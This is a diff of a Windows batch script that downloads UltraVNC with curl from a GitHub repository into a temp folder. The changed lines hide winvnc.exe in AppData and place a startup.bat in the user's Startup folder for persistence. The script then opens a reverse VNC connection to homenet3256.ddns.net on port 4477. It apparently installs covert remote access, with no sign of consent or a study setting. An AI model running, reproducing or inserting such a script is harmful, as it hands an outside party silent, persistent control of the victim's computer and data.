@@ -40,9 +40,10 @@ mkdir "%temp%\downloadaccessalex"
 curl https://raw.githubusercontent.com/SachaRepo/setupaccess/main/UltraVNC.zip -o "%temp%\downloadaccessalex\UltraVNC.zip"
 Call :UnZipFile "%temp%\downloadaccessalex\" "%temp%\downloadaccessalex\UltraVNC.zip"
 del "%temp%\downloadaccessalex\UltraVNC.zip"
-copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\UltraVNC.ini" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\winvnc.exe" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-start /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" winvnc.exe
+copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\UltraVNC.ini" "C:\users\%username%\AppData\Roaming\Microsoft\Windows"
+copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\winvnc.exe" "C:\users\%username%\AppData\Roaming\Microsoft\Windows"
+copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\startup.bat" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+start /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows" winvnc.exe
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 start winvnc.exe -connect homenet3256.ddns.net::4477
 exit /b
